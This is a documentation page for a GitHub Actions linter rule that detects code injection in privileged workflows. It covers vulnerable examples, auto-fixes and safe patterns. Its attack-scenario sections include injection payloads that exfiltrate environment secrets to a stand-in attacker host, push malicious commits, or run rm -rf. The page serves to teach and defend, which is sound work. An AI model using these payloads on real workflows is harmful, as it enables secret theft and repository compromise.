---
title: "Code Injection Rule (Critical)"
weight: 9
# bookFlatSection: false
# bookToc: true
# bookHidden: false
# bookCollapseSection: false
# bookComments: false
# bookSearchExclude: false
---

### Code Injection Rule (Critical) Overview

This rule detects code injection vulnerabilities when untrusted input is used directly in shell scripts or JavaScript code within **privileged workflow contexts**. Privileged workflows have write permissions or access to secrets, making them high-value targets for attackers.

#### Key Features:

- **Privileged Context Detection**: Identifies dangerous patterns in `pull_request_target`, `workflow_run`, `issue_comment`, and other privileged triggers
- **Dual Script Detection**: Analyzes both `run:` scripts and `actions/github-script` for untrusted input
- **Auto-fix Support**: Automatically converts unsafe patterns to use environment variables
- **Zero False Negatives**: Does not flag already-safe patterns using environment variables

### Security Impact

**Severity: Critical (10/10)**

Code injection in privileged workflows represents the highest severity vulnerability in GitHub Actions:

1. **Arbitrary Code Execution**: Attackers can execute arbitrary commands in the runner environment
2. **Secret Exfiltration**: Access to repository secrets and GITHUB_TOKEN with write permissions
3. **Repository Compromise**: Ability to modify code, create releases, or manipulate repository settings
4. **Supply Chain Attack**: Compromised workflows can poison artifacts or deployments

This vulnerability is classified as **CWE-94: Improper Control of Generation of Code ('Code Injection')** and aligns with OWASP CI/CD Security Risk **CICD-SEC-04: Poisoned Pipeline Execution (PPE)**.

### Privileged Workflow Triggers

The following triggers are considered privileged because they run with write access or secrets:

- **`pull_request_target`**: Runs with write permissions and secrets, but triggered by untrusted PRs
- **`workflow_run`**: Executes with elevated privileges after another workflow completes
- **`issue_comment`**: Triggered by comments from any user, including external contributors
- **`issues`**: Triggered by issue events, potentially from untrusted sources
- **`discussion_comment`**: Triggered by discussion comments from any user

### Example Vulnerable Workflow

Consider this dangerous workflow that processes PR titles in a privileged context:

```yaml
name: Auto-label PRs

on:
  pull_request_target:  # PRIVILEGED: Has write access and secrets
    types: [opened, edited]

jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      # CRITICAL VULNERABILITY: Untrusted input in privileged context
      - name: Add label based on title
        run: |
          TITLE="${{ github.event.pull_request.title }}"
          echo "Processing PR: $TITLE"
          gh pr edit ${{ github.event.pull_request.number }} --add-label "needs-review"
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

### Attack Scenario

**How Code Injection Exploits Privileged Workflows:**

1. **Attacker Creates Malicious PR**: Opens a PR with a crafted title:
   ```
   Title: "; curl https://attacker.com/$(cat /proc/self/environ | base64) #
   ```

2. **Workflow Triggers**: `pull_request_target` runs with write permissions

3. **Command Injection**: The shell interprets the malicious title:
   ```bash
   TITLE=""; curl https://attacker.com/$(cat /proc/self/environ | base64) #"
   ```

4. **Secret Exfiltration**: Environment variables (including secrets) are sent to attacker

5. **Further Exploitation**: Attacker can modify code, create malicious releases, or poison artifacts

This attack is devastating because:
- No code review is needed (PR can be from external contributor)
- Secrets are exposed immediately upon PR creation
- GITHUB_TOKEN has write permissions
- Attack leaves minimal traces

### Example Output

Running sisakulint will detect untrusted input in privileged contexts:

```bash
$ sisakulint

.github/workflows/pr-label.yaml:12:20: code injection (critical): "github.event.pull_request.title" is potentially untrusted and used in a workflow with privileged triggers. Avoid using it directly in inline scripts. Instead, pass it through an environment variable. See https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions [code-injection-critical]
     12 👈|        run: |
              TITLE="${{ github.event.pull_request.title }}"
```

### Auto-fix Support

The code-injection-critical rule supports auto-fixing by converting unsafe patterns to use environment variables:

```bash
# Preview changes without applying
sisakulint -fix dry-run

# Apply fixes
sisakulint -fix on
```

#### Auto-fix for Run Scripts

**Before (Vulnerable):**
```yaml
on: pull_request_target
jobs:
  process:
    runs-on: ubuntu-latest
    steps:
      - name: Process PR
        run: echo "Title: ${{ github.event.pull_request.title }}"
```

**After (Secure):**
```yaml
on: pull_request_target
jobs:
  process:
    runs-on: ubuntu-latest
    steps:
      - name: Process PR
        run: echo "Title: $PR_TITLE"
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
```

#### Auto-fix for GitHub Script

**Before (Vulnerable):**
```yaml
on: issue_comment
jobs:
  respond:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/github-script@v6
        with:
          script: |
            const body = '${{ github.event.comment.body }}'
            console.log('Comment:', body)
```

**After (Secure):**
```yaml
on: issue_comment
jobs:
  respond:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/github-script@v6
        with:
          script: |
            const body = process.env.COMMENT_BODY
            console.log('Comment:', body)
        env:
          COMMENT_BODY: ${{ github.event.comment.body }}
```

### Best Practices

#### 1. Always Use Environment Variables for Untrusted Input

**Bad (Vulnerable):**
```yaml
on: pull_request_target
jobs:
  test:
    steps:
      - run: echo "${{ github.event.pull_request.title }}"
```

**Good (Safe):**
```yaml
on: pull_request_target
jobs:
  test:
    steps:
      - run: echo "$PR_TITLE"
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
```

#### 2. Avoid Privileged Triggers When Possible

Use `pull_request` instead of `pull_request_target` unless you specifically need write access:

**Bad (Unnecessary Privilege):**
```yaml
on: pull_request_target  # Has write access
jobs:
  test:
    steps:
      - uses: actions/checkout@v4
      - run: npm test  # Doesn't need write access
```

**Good (Least Privilege):**
```yaml
on: pull_request  # Read-only
jobs:
  test:
    steps:
      - uses: actions/checkout@v4
      - run: npm test
```

#### 3. Limit Permissions Explicitly

Even in privileged workflows, restrict permissions:

```yaml
on: pull_request_target
jobs:
  label:
    permissions:
      contents: read
      pull-requests: write  # Only what's needed
    steps:
      - run: echo "$PR_TITLE"
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
```

#### 4. Validate Input Before Use

Add validation layers when processing untrusted input:

```yaml
on: issue_comment
jobs:
  process:
    runs-on: ubuntu-latest
    steps:
      - name: Validate and process comment
        run: |
          # Validate input format
          if [[ ! "$COMMENT_BODY" =~ ^[a-zA-Z0-9\ ]+$ ]]; then
            echo "Invalid input"
            exit 1
          fi
          echo "Processing: $COMMENT_BODY"
        env:
          COMMENT_BODY: ${{ github.event.comment.body }}
```

### Common Untrusted Inputs

The following GitHub context properties are considered untrusted in privileged workflows:

**Pull Request Data:**
- `github.event.pull_request.title`
- `github.event.pull_request.body`
- `github.event.pull_request.head.ref`
- `github.event.pull_request.head.label`
- `github.event.pull_request.head.repo.default_branch`

**Issue Data:**
- `github.event.issue.title`
- `github.event.issue.body`

**Comment Data:**
- `github.event.comment.body`
- `github.event.review.body`
- `github.event.discussion.title`
- `github.event.discussion.body`

**Other Untrusted Sources:**
- `github.event.pages.*.page_name`
- `github.head_ref`

### Real-World Attack Vectors

#### Attack Vector 1: Secret Exfiltration via PR Title

**Malicious PR Title:**
```
Fix typo"; curl https://attacker.com/exfil?data=$(env | base64) #
```

**Vulnerable Workflow:**
```yaml
on: pull_request_target
jobs:
  greet:
    steps:
      - run: echo "Thanks for: ${{ github.event.pull_request.title }}"
        env:
          SECRET_TOKEN: ${{ secrets.API_KEY }}
```

**Result:** All environment variables (including secrets) sent to attacker.

#### Attack Vector 2: Repository Takeover via Issue Comment

**Malicious Comment:**
```
Great idea! "; git clone https://github.com/$REPO ..; echo "malicious code" > ../index.js; git add .; git commit -m "update"; git push #
```

**Vulnerable Workflow:**
```yaml
on: issue_comment
jobs:
  respond:
    steps:
      - uses: actions/checkout@v4
      - run: echo "Comment: ${{ github.event.comment.body }}"
```

**Result:** Malicious code committed to repository with GITHUB_TOKEN.

#### Attack Vector 3: Artifact Poisoning via Workflow Run

**Malicious Workflow Run:**
```yaml
# Triggered workflow
on: workflow_run
jobs:
  deploy:
    steps:
      - run: echo "${{ github.event.workflow_run.display_title }}"
      - run: ./deploy.sh  # Executes with poisoned title
```

**Result:** Deployment workflow compromised.

### Detection Patterns

The code-injection-critical rule detects:

1. **Direct interpolation in run scripts**:
   ```yaml
   run: echo "${{ github.event.pull_request.title }}"
   ```

2. **Direct interpolation in github-script**:
   ```yaml
   script: |
     console.log('${{ github.event.comment.body }}')
   ```

3. **Multiple untrusted inputs**:
   ```yaml
   run: |
     echo "${{ github.event.pull_request.title }}"
     echo "${{ github.event.pull_request.body }}"
   ```

4. **Unquoted environment variables containing untrusted input**:
   ```yaml
   env:
     PR_TITLE: ${{ github.event.pull_request.title }}
   run: echo $PR_TITLE  # Missing quotes!
   ```

5. **eval with untrusted input (even when quoted)**:
   ```yaml
   env:
     CMD: ${{ github.event.comment.body }}
   run: eval "echo $CMD"  # Dangerous even with quotes!
   ```

6. **sh -c / bash -c with untrusted input**:
   ```yaml
   env:
     BODY: ${{ github.event.pull_request.body }}
   run: sh -c "process $BODY"  # Creates nested shell parsing
   ```

7. **Command substitution with untrusted input**:
   ```yaml
   env:
     TITLE: ${{ github.event.pull_request.title }}
   run: result=$(echo $TITLE)  # Untrusted input in subshell
   ```

### Safe Patterns

The rule recognizes these patterns as safe:

1. **Properly quoted environment variables**:
   ```yaml
   run: echo "$PR_TITLE"  # Double quotes prevent shell metacharacter attacks
   env:
     PR_TITLE: ${{ github.event.pull_request.title }}
   ```

2. **Trusted inputs** (not flagged):
   ```yaml
   run: echo "${{ github.sha }}"  # Trusted
   run: echo "${{ github.repository }}"  # Trusted
   ```

3. **Passing environment variables to subshells safely**:
   ```yaml
   env:
     PR_TITLE: ${{ github.event.pull_request.title }}
   run: |
     export PR_TITLE
     sh -c 'echo "$PR_TITLE"'  # Single quotes prevent expansion in outer shell
   ```

4. **Using printf for safer output**:
   ```yaml
   env:
     PR_TITLE: ${{ github.event.pull_request.title }}
   run: printf '%s\n' "$PR_TITLE"  # printf with %s is safer than echo
   ```

### Shell Metacharacter Injection

Even when using environment variables (which is the recommended practice), improper shell handling can still lead to injection vulnerabilities. The rule detects several dangerous patterns:

#### Unquoted Variables

**Vulnerable:**
```yaml
env:
  PR_TITLE: ${{ github.event.pull_request.title }}
run: echo $PR_TITLE
```

Without quotes, the shell performs word splitting and glob expansion. An attacker could use:
- `* /etc/passwd` - glob expansion to list files
- `$(malicious_command)` - command substitution

**Safe:**
```yaml
env:
  PR_TITLE: ${{ github.event.pull_request.title }}
run: echo "$PR_TITLE"  # Double quotes prevent expansion
```

#### eval Command

**Vulnerable:**
```yaml
env:
  CMD: ${{ github.event.comment.body }}
run: eval "echo $CMD"
```

Even with quotes, `eval` parses the string again, enabling:
- `"; curl attacker.com #` - break out and execute arbitrary commands

**Safe Alternative:**
```yaml
env:
  CMD: ${{ github.event.comment.body }}
run: |
  # Use printf %q for proper escaping if eval is necessary
  escaped=$(printf '%q' "$CMD")
  # Or better, avoid eval entirely and use the variable directly
  echo "$CMD"
```

#### Nested Shell Commands (sh -c, bash -c)

**Vulnerable:**
```yaml
env:
  BODY: ${{ github.event.pull_request.body }}
run: sh -c "process $BODY"
```

Creates a new shell that parses the string again, vulnerable to:
- `"; rm -rf / #` - command injection via quote escaping

**Safe:**
```yaml
env:
  BODY: ${{ github.event.pull_request.body }}
run: |
  # Export the variable and use single quotes in the subshell
  export BODY
  sh -c 'echo "$BODY"'  # Single quotes prevent outer shell expansion
```

#### Command Substitution

**Vulnerable:**
```yaml
env:
  TITLE: ${{ github.event.pull_request.title }}
run: result=$(grep $TITLE file.txt)
```

Unquoted variable in command substitution allows:
- Glob expansion
- Word splitting
- Embedded command injection

**Safe:**
```yaml
env:
  TITLE: ${{ github.event.pull_request.title }}
run: result=$(grep -F -- "$TITLE" file.txt)  # Quote and use -F for fixed strings
```

### Difference from Medium Severity

The **critical** rule only flags privileged triggers where exploitation has immediate severe impact. The **medium** rule flags the same patterns in normal triggers (`pull_request`, `push`) where the risk is lower.

| Trigger Type | Rule | Risk Level | Why Different |
|--------------|------|------------|---------------|
| `pull_request_target` | Critical | 10/10 | Write access + secrets |
| `pull_request` | Medium | 6/10 | Read-only, no secrets |
| `workflow_run` | Critical | 10/10 | Elevated privileges |
| `push` | Medium | 6/10 | Only trusted commits |

### Integration with GitHub Security Features

This rule complements GitHub's security features:

- **Branch Protection**: Require review for workflow changes
- **CODEOWNERS**: Mandate approval for `.github/workflows/` changes
- **Required Status Checks**: Block PRs if sisakulint fails
- **Secret Scanning**: Detect exposed secrets
- **Code Scanning**: Run CodeQL for comprehensive analysis

### CodeQL Integration

This rule is inspired by CodeQL's code-injection-critical query:
- [CodeQL Query: Code Injection (Critical)](https://codeql.github.com/codeql-query-help/actions/actions-code-injection-critical/)

sisakulint provides:
- Faster feedback during development
- Auto-fix capabilities
- No GitHub Advanced Security license required
- Integration with local development workflow

### OWASP CI/CD Security Alignment

This rule addresses:

**CICD-SEC-04: Poisoned Pipeline Execution (PPE)**
- Prevents command injection in privileged contexts
- Enforces safe handling of untrusted input
- Reduces attack surface in CI/CD pipelines

**CWE-94: Improper Control of Generation of Code**
- Prevents dynamic code generation from untrusted sources
- Enforces input validation and sanitization

### Complementary Rules

Use these rules together for defense in depth:

1. **code-injection-medium**: Detect same issues in normal triggers
2. **envvar-injection-critical**: Adds specialized detection and mitigation for $GITHUB_ENV writes (see [Rule Interactions]({{< ref "envvarinjectioncritical.md#rule-interactions" >}}) for details)
3. **permissions**: Limit workflow permissions to minimum necessary
4. **timeout-minutes**: Prevent resource exhaustion attacks
5. **commit-sha**: Pin actions to prevent supply chain attacks

### Performance Considerations

This rule has minimal performance impact:
- **Detection**: O(n) where n is the number of steps
- **Auto-fix**: In-place AST and YAML modification
- **No External Calls**: Purely static analysis

### See Also

**Industry References:**
- [CodeQL: Code Injection (Critical)](https://codeql.github.com/codeql-query-help/actions/actions-code-injection-critical/) - CodeQL's detection pattern
- [GitHub: Security Hardening for GitHub Actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions) - Official security guidance
- [OWASP: CICD-SEC-04 - PPE](https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-04-Poisoned-Pipeline-Execution) - Attack patterns
- [CWE-94: Code Injection](https://cwe.mitre.org/data/definitions/94.html) - Vulnerability classification
- [GitHub: Keeping Actions Secure](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#using-third-party-actions) - Action security best practices

{{< popup_link2 href="https://codeql.github.com/codeql-query-help/actions/actions-code-injection-critical/" >}}

{{< popup_link2 href="https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions" >}}

{{< popup_link2 href="https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-04-Poisoned-Pipeline-Execution" >}}

{{< popup_link2 href="https://cwe.mitre.org/data/definitions/94.html" >}}

{{< popup_link2 href="https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#using-third-party-actions" >}}
